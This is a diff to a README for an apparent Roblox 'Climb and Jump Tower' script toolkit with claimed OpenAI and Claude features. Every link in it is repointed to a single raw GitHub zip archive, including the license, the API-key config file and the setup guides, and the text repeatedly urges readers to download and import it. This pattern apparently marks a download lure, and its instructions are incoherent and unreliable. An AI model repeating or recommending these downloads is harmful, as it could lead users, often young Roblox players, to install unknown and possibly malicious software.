@@ -43,9 +43,9 @@ Harness the genius of the world’s leading AI platforms within your Roblox towe
 - **OpenAI Integration:** Activate contextually aware game helpers, offer hints, or generate automated reports based on player progress.
 - **Claude Integration:** Enable conversational NPCs to provide immersive, story-driven support or tower tips.
 - **Simple Setup:**
-  1. Add your respective API key to the `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip` file.
+  1. Add your respective API key to the `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip` file.
   2. Enable AI features through the script settings panel.
-- See `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip` for setup walkthroughs and code samples.
+- See `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip` for setup walkthroughs and code samples.
 
 ---
 
@@ -57,10 +57,10 @@ Harness the genius of the world’s leading AI platforms within your Roblox towe
 
 ---
 
-# [![Download](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)
+# [![Download](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)
 
 Download the Climb and Jump Tower Script for Roblox (2025 version)!    
-**Click the badge above or [here](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)** to get your hands on the latest script package.
+**Click the badge above or [here](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)** to get your hands on the latest script package.
 
 *(All download links are for demonstration use.)*
 
@@ -90,12 +90,12 @@ Download the Climb and Jump Tower Script for Roblox (2025 version)!
 
 1. Install Roblox Studio (latest version recommended).
 2. Download the script using this badge:  
-   [![Download](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)
+   [![Download](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)
 3. Extract and import `/src` into your Roblox project.
-4. Configure API access in `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip` for enhanced AI features.
+4. Configure API access in `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip` for enhanced AI features.
 5. Try the `/examples` demo towers before integrating into your own levels!
 
-For a guided setup, see `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip`.
+For a guided setup, see `https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip`.
 
 ---
 
@@ -119,7 +119,7 @@ No real-world climbing advice included!
 
 ## 📜 License
 
-All contents are licensed under the [MIT License](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip) (2025).  
+All contents are licensed under the [MIT License](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip) (2025).  
 Feel free to remix, extend, and deploy—credit is appreciated but not required.
 
 ---
@@ -127,7 +127,7 @@ Feel free to remix, extend, and deploy—credit is appreciated but not required.
 ## 📥 Download Again Anytime!
 
 Tap below to get the current 2025 script set with full documentation and examples:  
-[![Download](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb-jump-tower-roblox-toolkit-1.0.zip)
+[![Download](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)](https://raw.githubusercontent.com/Kaiga-kun/climb-jump-tower-roblox-toolkit/branch/gadling/climb_roblox_jump_toolkit_tower_3.4.zip)
 
 *(All download links are reserved as placeholders.)*
 
